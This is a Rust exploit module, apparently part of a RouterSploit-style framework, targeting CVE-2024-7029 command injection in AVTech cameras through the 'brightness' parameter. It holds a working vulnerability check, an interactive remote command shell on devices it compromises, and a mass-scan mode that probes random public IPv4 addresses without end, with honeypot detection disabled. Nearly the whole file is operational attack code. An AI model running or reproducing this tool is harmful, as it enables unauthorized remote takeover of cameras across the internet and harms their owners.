use anyhow::{Result, Context};
use colored::*;
use rand::Rng;
use reqwest::Client;
use std::net::{IpAddr, Ipv4Addr};
use std::path::Path;
use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::time::Duration;
use std::io::Write;

use tokio::sync::Semaphore;
use crate::utils::{escape_shell_command, normalize_target, prompt_port};


const DEFAULT_TIMEOUT_SECS: u64 = 10;
const MASS_SCAN_CONCURRENCY: usize = 100;
const MASS_SCAN_PORT: u16 = 80;

// Bogon/Private/Reserved exclusion ranges
const EXCLUDED_RANGES: &[&str] = &[
    "10.0.0.0/8", "127.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
    "224.0.0.0/4", "240.0.0.0/4", "0.0.0.0/8",
    "100.64.0.0/10", "169.254.0.0/16", "255.255.255.255/32",
    "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22", "104.16.0.0/13",
    "104.24.0.0/14", "108.162.192.0/18", "131.0.72.0/22", "141.101.64.0/18",
    "162.158.0.0/15", "172.64.0.0/13", "173.245.48.0/20", "188.114.96.0/20",
    "190.93.240.0/20", "197.234.240.0/22", "198.41.128.0/17",
    "1.1.1.1/32", "1.0.0.1/32", "8.8.8.8/32", "8.8.4.4/32",
];

fn generate_random_public_ip(exclusions: &[ipnetwork::IpNetwork]) -> IpAddr {
    let mut rng = rand::rng();
    loop {
        let octets: [u8; 4] = rng.random();
        let ip = Ipv4Addr::from(octets);
        let ip_addr = IpAddr::V4(ip);
        if !exclusions.iter().any(|net| net.contains(ip_addr)) {
            return ip_addr;
        }
    }
}

/// Display module banner
fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   AVTech Camera CVE-2024-7029 RCE Exploit                 ║".cyan());
    println!("{}", "║   Command Injection via brightness parameter              ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}



/// Check if the device is vulnerable to CVE-2024-7029
async fn check_vuln(client: &Client, base: &str) -> Result<bool> {
    println!("{}", "[*] Checking vulnerability...".cyan());
    let mut url = reqwest::Url::parse(base)?;
    url.set_path("/cgi-bin/supervisor/Factory.cgi");
    url.query_pairs_mut()
        .append_pair("action", "Set")
        .append_pair("brightness", "1;echo_CVE7029;");
    let resp = client.get(url).send().await?;
    let body = resp.text().await?;
    Ok(body.contains("echo_CVE7029"))
}

/// Interactive shell to send arbitrary commands
async fn interactive_shell(client: &Client, base: &str) -> Result<()> {

    let stdin = std::io::stdin();
    let mut line = String::new();

    println!("{}", "[+] Interactive shell started. Type 'exit' to quit.".green().bold());
    loop {
        print!("{}", "cve7029-shell> ".cyan().bold());
        std::io::stdout()
            .flush()
            .context("Failed to flush stdout")?;
        if stdin.read_line(&mut line).is_err() {
            break;
        }
        
        let cmd = line.trim().to_string();
        line.clear();
        
        {
            if cmd.eq_ignore_ascii_case("exit") {
                println!("{}", "[*] Exiting shell...".yellow());
                break;
            }
            if cmd.is_empty() {
                continue;
            }
            match exec_cmd(client, base, &cmd).await {
                Ok(out) => println!("{}", out),
                Err(e) => println!("{}", format!("[-] Error: {}", e).red()),
            }
        }
    }
    Ok(())
}

/// // Execute a remote command by abusing the brightness parameter
async fn exec_cmd(client: &Client, base: &str, cmd: &str) -> Result<String> {
    let mut url = reqwest::Url::parse(base)?;
    url.set_path("/cgi-bin/supervisor/Factory.cgi");
    // Escape command to prevent injection of additional shell commands
    let escaped_cmd = escape_shell_command(cmd);
    let payload = format!("1;{};", escaped_cmd);
    url.query_pairs_mut()
        .append_pair("action", "Set")
        .append_pair("brightness", &payload);
    let response = client.get(url).send().await?;
    Ok(response.text().await?)
}



/// Quick vulnerability check for mass scanning
async fn quick_check(client: &Client, ip: &str) -> bool {
    let host = format!("{}:{}", ip, MASS_SCAN_PORT);
    let url = format!("http://{}/cgi-bin/supervisor/Factory.cgi?action=Set&brightness=1;echo_CVE7029;", host);
    
    match tokio::time::timeout(
        Duration::from_secs(5),
        client.get(&url).send()
    ).await {
        Ok(Ok(resp)) => {
             if let Ok(body) = resp.text().await {
                 body.contains("echo_CVE7029")
             } else {
                 false
             }
        },
        _ => false,
    }
}

/// Mass scan mode
async fn run_mass_scan() -> Result<()> {
    display_banner();
    println!("{}", "[*] Mass Scan Mode: 0.0.0.0/0".yellow().bold());
    println!("{}", "[*] Honeypot detection: DISABLED".yellow());
    println!("{}", format!("[*] Concurrency: {}", MASS_SCAN_CONCURRENCY).cyan());

    // Prompt for exclusions
    print!("{}", "[?] Exclude reserved/private ranges? [Y/n]: ".cyan());
    std::io::stdout().flush()?;
    let mut excl_choice = String::new();
    std::io::stdin().read_line(&mut excl_choice)?;
    let use_exclusions = !matches!(excl_choice.trim().to_lowercase().as_str(), "n" | "no");

    let mut exclusions = Vec::new();
    if use_exclusions {
        for cidr in EXCLUDED_RANGES {
            if let Ok(net) = cidr.parse::<ipnetwork::IpNetwork>() {
                exclusions.push(net);
            }
        }
    }
    let exclusions = Arc::new(exclusions);
    
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS))
        .build()?;
    let client = Arc::new(client);
    
    let semaphore = Arc::new(Semaphore::new(MASS_SCAN_CONCURRENCY));
    let checked = Arc::new(AtomicUsize::new(0));
    let found = Arc::new(AtomicUsize::new(0));
    
    let c = checked.clone();
    let f = found.clone();
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(Duration::from_secs(10)).await;
            println!("[*] Checked: {} | Found: {}", c.load(Ordering::Relaxed), f.load(Ordering::Relaxed));
        }
    });
    
    loop {
        let permit = semaphore.clone().acquire_owned().await.map_err(|e| anyhow::anyhow!("Semaphore closed: {}", e))?;
        let exc = exclusions.clone();
        let cl = client.clone();
        let chk = checked.clone();
        let fnd = found.clone();
        
        tokio::spawn(async move {
            let ip = generate_random_public_ip(&exc);
            let ip_str = ip.to_string();
            
            if quick_check(&cl, &ip_str).await {
                println!("{}", format!("[+] VULNERABLE: {}", ip_str).green().bold());
                fnd.fetch_add(1, Ordering::Relaxed);
            }
            
            chk.fetch_add(1, Ordering::Relaxed);
            drop(permit);
        });
    }
}


/// Entry point required for RouterSploit-inspired dispatch system
pub async fn run(target: &str) -> Result<()> {
    if target == "0.0.0.0" || target == "0.0.0.0/0" || target.is_empty() || target == "random" {
        run_mass_scan().await
    } else {
        display_banner();
        println!("{}", format!("[*] Target: {}", target).yellow());
        println!();

        let port = prompt_port("Enter port to use", 80)?;
        let client = Client::builder()
            .danger_accept_invalid_certs(true)
            .timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS))
            .build()?;

        // Handle either single IP or file of targets
        let targets = if Path::new(target).exists() {
            println!("{}", format!("[*] Loading targets from file: {}", target).cyan());
            tokio::fs::read_to_string(target)
                .await?
                .lines()
                .map(str::to_string)
                .filter(|s| !s.trim().is_empty())
                .collect::<Vec<_>>()
        } else {
            vec![target.to_string()]
        };

        println!("{}", format!("[*] Testing {} target(s)...", targets.len()).cyan());
        println!();

        for raw_ip in &targets {
            let scheme = if raw_ip.starts_with("https://") { "https" } else { "http" };
            let normalized = normalize_target(raw_ip)?; 
            
            let url = if normalized.contains("]:") || (normalized.contains(':') && !normalized.starts_with('[')) {
                 format!("{}://{}", scheme, normalized)
            } else {
                 format!("{}://{}:{}", scheme, normalized, port)
            };

            println!("{}", format!("[*] Testing: {}", url).yellow());
            
            if check_vuln(&client, &url).await? {
                println!("{}", format!("[+] {} is VULNERABLE!", url).green().bold());
                interactive_shell(&client, &url).await?;
            } else {
                println!("{}", format!("[-] {} is not vulnerable", url).red());
            }
            println!();
        }

        println!("{}", "[*] Scan complete.".cyan());
        Ok(())
    }
}
